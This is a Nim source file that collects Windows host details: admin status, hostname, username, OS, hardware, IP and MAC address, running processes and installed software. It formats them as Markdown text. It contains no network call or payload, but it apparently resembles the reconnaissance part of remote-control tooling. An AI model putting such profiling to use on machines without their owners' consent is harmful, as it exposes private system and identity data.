import os, strutils, sets

when defined(windows):
  import math
  import winim/lean, winim/inc/tlhelp32, winim/inc/iphlpapi

  const tokenElevationClass = TOKEN_INFORMATION_CLASS(20)

type
  SystemInfo* = object
    isAdmin*: bool
    hostname*: string
    username*: string
    windowsEdition*: string
    osVersion*: string
    architecture*: string
    cpu*: string
    gpus*: seq[string]
    biosVersion*: string
    biosType*: string
    osLanguage*: string
    timezone*: string
    ramUsedGb*: float
    ramMaxGb*: int
    privateIp*: string
    macAddress*: string
  ProcessInfo* = object
    name*: string
    process*: string
    pid*: int
  InstalledApp* = object
    name*: string
    path*: string

when defined(windows):

  proc wstringToString(p: ptr WCHAR): string =
    if p == nil:
      return ""
    $cast[WideCString](p)

  when not declared(PROCESS_QUERY_LIMITED_INFORMATION):
    const PROCESS_QUERY_LIMITED_INFORMATION = 0x1000'i32


  proc readRegString(root: HKEY, subKey, valueName: string): string =
    var hKey: HKEY
    if RegOpenKeyExA(root, subKey, 0, KEY_READ, addr hKey) != ERROR_SUCCESS:
      return ""
    defer: RegCloseKey(hKey)

    var valueType: DWORD
    var size: DWORD = 0
    if RegQueryValueExA(hKey, valueName, nil, addr valueType, nil, addr size) != ERROR_SUCCESS:
      return ""

    if valueType != REG_SZ and valueType != REG_EXPAND_SZ:
      return ""

    var buffer = newString(size)
    if RegQueryValueExA(hKey, valueName, nil, nil,
        cast[LPBYTE](buffer.cstring), addr size) == ERROR_SUCCESS:
      return buffer.strip(chars = {'\0'}).strip()
    ""


  proc isAdmin(): bool =
    var hToken: HANDLE = 0
    if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, addr hToken) == 0:
      return false
    defer: CloseHandle(hToken)

    var elevation: TOKEN_ELEVATION
    var retLen: DWORD = 0
    if GetTokenInformation(hToken, tokenElevationClass, cast[LPVOID](addr elevation), DWORD(sizeof(elevation)), addr retLen) == 0:
      return false
    elevation.TokenIsElevated != 0


  proc getWinEditionAndVersion(): (string, string) =
    const cv = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion"
    var product = readRegString(HKEY_LOCAL_MACHINE, cv, "ProductName")
    var display = readRegString(HKEY_LOCAL_MACHINE, cv, "DisplayVersion")
    if display.len == 0:
      display = readRegString(HKEY_LOCAL_MACHINE, cv, "ReleaseId")

    let buildStr = readRegString(HKEY_LOCAL_MACHINE, cv, "CurrentBuild")
    try:
      if buildStr.len > 0 and parseInt(buildStr) >= 22000:
        product = product.replace("Windows 10", "Windows 11")
    except: discard

    (product, display)


  proc getCpuName(): string =
    readRegString(HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\System\CentralProcessor\0", "ProcessorNameString")


  proc getBiosVersion(): string =
    var v = readRegString(HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\System\BIOS", "BIOSVersion")
    if v.len == 0:
      v = readRegString(HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\System\BIOS", "SystemBiosVersion")
    if v.len == 0:
      let man = readRegString(HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\System\BIOS", "Vendor")
      let rev = readRegString(HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\System\BIOS", "BIOSReleaseDate")
      if man.len > 0 or rev.len > 0:
        v = (man & " " & rev).strip()
    v


  proc getBiosType(): string =
    var h: HKEY
    let rc = RegOpenKeyExA(HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\SecureBoot\State", 0, KEY_READ, addr h)
    if rc == ERROR_SUCCESS:
      RegCloseKey(h)
      "UEFI"
    else:
      "Legacy"


  proc enumSubKeys(root: HKEY, subKey: string): seq[string] =
    var res: seq[string] = @[]
    var hKey: HKEY
    if RegOpenKeyExA(root, subKey, 0, KEY_READ, addr hKey) != ERROR_SUCCESS:
      return res
    defer: RegCloseKey(hKey)

    var subKeyCount: DWORD
    var maxSubKeyLen: DWORD
    if RegQueryInfoKeyA(hKey, nil, nil, nil, addr subKeyCount, addr maxSubKeyLen,
                        nil, nil, nil, nil, nil, nil) != ERROR_SUCCESS:
      return res

    for i in 0 ..< subKeyCount.int:
      var nameLen = maxSubKeyLen + 1
      var name = newString(nameLen)
      if RegEnumKeyExA(hKey, DWORD(i), name.cstring, addr nameLen,
                       nil, nil, nil, nil) == ERROR_SUCCESS:
        name.setLen(nameLen.int)
        if name.len > 0:
          res.add(name)
    res


  proc getGpusFromRegistry(): seq[string] =
    var res: seq[string] = @[]
    let base = r"SYSTEM\CurrentControlSet\Control\Video"
    for guid in enumSubKeys(HKEY_LOCAL_MACHINE, base):
      for idx in ["0000", "0001"]:
        let path = base & "\\" & guid & "\\" & idx
        var desc = readRegString(HKEY_LOCAL_MACHINE, path, "DriverDesc")
        if desc.len == 0:
          desc = readRegString(HKEY_LOCAL_MACHINE, path, "Device Description")
        if desc.len > 0 and not res.contains(desc):
          res.add(desc)
    res


  proc getGpus(): seq[string] =
    var res: seq[string] = @[]
    var i: DWORD = 0
    while true:
      var dd: DISPLAY_DEVICEA
      dd.cb = DWORD(sizeof(dd))
      if not EnumDisplayDevicesA(cast[LPCSTR](nil), i, addr dd, DWORD(0)):
        break
      let name = $dd.DeviceString
      if (dd.StateFlags and DISPLAY_DEVICE_MIRRORING_DRIVER) != 0:
        inc i
        continue
      if (dd.StateFlags and DISPLAY_DEVICE_ACTIVE) == 0:
        inc i
        continue
      if name.len > 0 and not res.contains(name):
        res.add(name.strip())
      inc i
    if res.len == 0:
      return getGpusFromRegistry()
    res


  proc getTimeZone(): string =
    var tz: DYNAMIC_TIME_ZONE_INFORMATION
    if GetDynamicTimeZoneInformation(addr tz) == DWORD(-1):
      return ""
    let bias = -int(tz.Bias)
    let h = bias div 60
    let m = abs(bias mod 60)
    let sign = if h >= 0: "+" else: ""
    "(UTC" & sign & $h & ":" & m.intToStr().align(2, '0') & ") " & wstringToString(addr tz.StandardName[0])


  proc getRamUsedAndMax(): (float, int) =
    var ms: MEMORYSTATUSEX
    ms.dwLength = DWORD(sizeof(MEMORYSTATUSEX))
    if GlobalMemoryStatusEx(addr ms) == 0:
      return (0.0, 0)
    let totalBytes = float(ms.ullTotalPhys)
    let availBytes = float(ms.ullAvailPhys)
    let usedBytes = max(0.0, totalBytes - availBytes)
    let gb = 1024.0 * 1024.0 * 1024.0
    let usedGb = round((usedBytes / gb) * 100.0) / 100.0
    let maxGbRaw = totalBytes / gb
    let maxGb = int(ceil(maxGbRaw))
    (usedGb, maxGb)


  proc getOsLanguage(): string =
    var buf: array[85, WCHAR]
    if GetUserDefaultLocaleName(addr buf[0], 85) > 0:
      wstringToString(addr buf[0])
    else:
      ""

  proc getNetworkInfo(): (string, string) =
    var size: ULONG = 0
    if GetAdaptersInfo(nil, addr size) != ERROR_BUFFER_OVERFLOW:
      return ("unknown", "unknown")

    var buffer = newSeq[byte](size)
    var pAdapter = cast[PIP_ADAPTER_INFO](addr buffer[0])

    if GetAdaptersInfo(pAdapter, addr size) == NO_ERROR:
      while pAdapter != nil:
        let ip = $cast[cstring](addr pAdapter.IpAddressList.IpAddress.String[0])
        # Filter loopback or empty/default
        if ip != "0.0.0.0" and ip != "127.0.0.1": 
          var macParts: seq[string] = @[]
          for i in 0 ..< int(pAdapter.AddressLength):
            macParts.add(toHex(int(pAdapter.Address[i]), 2))
          return (ip, macParts.join(":"))
        pAdapter = pAdapter.Next
    ("unknown", "unknown")

  proc getHostname(): string = getEnv("COMPUTERNAME")
  proc getUsername(): string = getEnv("USERNAME")


  proc getProcessPath(pid: DWORD): string =
    let hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid)
    if hProc == 0:
      return ""
    defer: CloseHandle(hProc)

    var buf: array[MAX_PATH * 4, WCHAR]
    var size = DWORD(buf.len)
    if QueryFullProcessImageNameW(hProc, 0, addr buf[0], addr size) == 0:
      return ""
    wstringToString(addr buf[0]).strip()


  proc getFileDescription(path: string): string =
    if path.len == 0:
      return ""
    var handle: DWORD
    let wpath = path.newWideCString()
    let size = GetFileVersionInfoSizeW(wpath, addr handle)
    if size == 0:
      return ""

    var data = newString(size)
    if GetFileVersionInfoW(wpath, 0, size, cast[LPVOID](data.cstring)) == 0:
      return ""

    var valuePtr: LPVOID
    var len: UINT
    let subKey = "\\StringFileInfo\\040904b0\\FileDescription".newWideCString()
    if VerQueryValueW(cast[LPVOID](data.cstring), subKey, addr valuePtr, addr len) == 0 or len == 0:
      return ""
    wstringToString(cast[ptr WCHAR](valuePtr)).strip()


  proc pickProcessName(exeName, exePath: string): string =
    let fromDescription = getFileDescription(exePath)
    if fromDescription.len > 0:
      return fromDescription

    let parts = splitFile(if exePath.len > 0: exePath else: exeName)
    if parts.name.len > 0:
      return parts.name
    if exeName.len > 0:
      return exeName
    ""


  proc getRunningProcesses*(): seq[ProcessInfo] =
    var res: seq[ProcessInfo] = @[]
    let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if snap == INVALID_HANDLE_VALUE:
      return res
    defer: CloseHandle(snap)

    var entry: PROCESSENTRY32W
    entry.dwSize = DWORD(sizeof(PROCESSENTRY32W))
    var hasItem = Process32FirstW(snap, addr entry)
    while hasItem:
      let pid = entry.th32ProcessID
      let exeName = wstringToString(addr entry.szExeFile[0]).strip()
      let lowerExe = exeName.toLowerAscii()

      # Skip PID 0 placeholder and common background service noise
      if pid == 0 or lowerExe in ["svchost.exe", "runtimebroker.exe"]:
        hasItem = Process32NextW(snap, addr entry)
        continue

      let exePath = getProcessPath(pid)
      let friendly = pickProcessName(exeName, exePath)
      res.add(ProcessInfo(name: friendly, process: exeName, pid: int(pid)))
      hasItem = Process32NextW(snap, addr entry)
    res


  proc parseExePath(raw: string): string =
    var val = raw.strip()
    if val.len == 0:
      return ""

    if val.startsWith("\""):
      let closeIdx = val.find('"', 1)
      if closeIdx > 1:
        val = val[1 ..< closeIdx]
    let commaIdx = val.find(',')
    if commaIdx != -1:
      val = val[0 ..< commaIdx]

    let lower = val.toLowerAscii()
    let exePos = lower.find(".exe")
    if exePos == -1:
      return ""

    var endIdx = exePos + 4
    while endIdx < val.len and val[endIdx] notin {' ', '\t', '"'}:
      inc endIdx
    val = val[0 ..< endIdx]
    val.strip(chars = {'"', ' '})


  proc findExeInDir(dirPath: string): string =
    if dirPath.len == 0 or not dirExists(dirPath):
      return ""
    for kind, path in walkDir(dirPath):
      if kind == pcFile and path.toLowerAscii().endsWith(".exe"):
        return path
    ""


  proc isValidExe(path: string): bool =
    if path.len == 0:
      return false
    if not path.toLowerAscii().endsWith(".exe"):
      return false
    if not path.isAbsolute:
      return false
    fileExists(path)


  proc addInstalledFromKey(root: HKEY, base: string, res: var seq[InstalledApp], seen: var HashSet[string]) =
    for sub in enumSubKeys(root, base):
      let path = base & "\\" & sub
      let name = readRegString(root, path, "DisplayName").strip()
      if name.len == 0:
        continue

      let installLoc = readRegString(root, path, "InstallLocation").strip()
      let icon = parseExePath(readRegString(root, path, "DisplayIcon"))
      let uninstall = parseExePath(readRegString(root, path, "UninstallString"))

      var exePath = icon
      if exePath.len == 0:
        exePath = findExeInDir(installLoc)
      if exePath.len == 0:
        exePath = uninstall

      if not isValidExe(exePath):
        continue

      let key = name & "|" & exePath
      if seen.contains(key):
        continue
      seen.incl(key)
      res.add(InstalledApp(name: name, path: exePath))


  proc getInstalledSoftware*(): seq[InstalledApp] =
    var res: seq[InstalledApp] = @[]
    var seen: HashSet[string]
    init(seen)
    const roots = [HKEY_LOCAL_MACHINE, HKEY_CURRENT_USER]
    const paths = [
      r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
      r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
    ]

    for root in roots:
      for base in paths:
        addInstalledFromKey(root, base, res, seen)
    res


  proc getSystemInfo*(): SystemInfo =
    let (ed, ver) = getWinEditionAndVersion()
    let (ramUsed, ramMax) = getRamUsedAndMax()
    let (ip, mac) = getNetworkInfo()
    SystemInfo(
      isAdmin: isAdmin(),
      hostname: getHostname(),
      username: getUsername(),
      windowsEdition: ed,
      osVersion: ver,
      architecture: getEnv("PROCESSOR_ARCHITECTURE"),
      cpu: getCpuName(),
      gpus: getGpus(),
      biosVersion: getBiosVersion(),
      biosType: getBiosType(),
      osLanguage: getOsLanguage(),
      timezone: getTimeZone(),
      ramUsedGb: ramUsed,
      ramMaxGb: ramMax,
      privateIp: ip,
      macAddress: mac
    )
# if not windows
else:

  proc getRunningProcesses*(): seq[ProcessInfo] = @[]
  proc getInstalledSoftware*(): seq[InstalledApp] = @[]

  proc getSystemInfo*(): SystemInfo =
    SystemInfo(
      isAdmin: false,
      hostname: getEnv("HOSTNAME"),
      username: getEnv("USER"),
      windowsEdition: "",
      osVersion: "",
      architecture: getEnv("PROCESSOR_ARCHITECTURE"),
      cpu: "",
      gpus: @[],
      biosVersion: "",
      biosType: "",
      osLanguage: "",
      timezone: "",
      ramUsedGb: 0.0,
      ramMaxGb: 0,
      privateIp: "",
      macAddress: ""
    )


proc getRunningProcessesText*(): string =
  result = ""
  let procs = getRunningProcesses()
  for p in procs:
    # Format: Friendly Name | Process Name | PID
    result.add(p.name & "|" & p.process & "|" & $p.pid & "\n")

proc getInstalledSoftwareText*(): string =
  result = ""
  let apps = getInstalledSoftware()
  for app in apps:
    # Format: App Name | Install Path
    result.add(app.name & "|" & app.path & "\n")


## Returns a formatted system info string.
proc getSystemInfoText*(): string =
  try:
    let info = getSystemInfo()
    var parts: seq[string] = @[]
    parts.add("**Private IP:** " & info.privateIp)
    parts.add("**MAC:** " & info.macAddress)
    parts.add("**Hostname:** " & info.hostname)
    parts.add("**Username:** " & info.username)
    parts.add("**Root:** " & $info.isAdmin)
    if info.windowsEdition.len > 0 and info.osVersion.len > 0:
      parts.add("**OS:** " & info.windowsEdition & " (" & info.osVersion & ")")
    if info.biosVersion.len > 0 and info.biosType.len > 0:
      parts.add("**BIOS:** " & info.biosVersion & " (" & info.biosType & ")")
    if info.architecture.len > 0:
      parts.add("**Architecture:** " & info.architecture)
    if info.cpu.len > 0:
      parts.add("**CPU:** " & info.cpu)
    if info.gpus.len > 0:
      parts.add("**GPUs:** " & info.gpus.join(", "))
    parts.add("**RAM:** " & $info.ramUsedGb & "GB / " & $info.ramMaxGb & "GB")
    if info.osLanguage.len > 0:
      parts.add("**OS Language:** " & info.osLanguage)
    if info.timezone.len > 0:
      parts.add("**Timezone:** " & info.timezone)
    result = parts.join("\n")
  except Exception as e:
    echo "Failed to retrieve system info. Error: " & e.msg
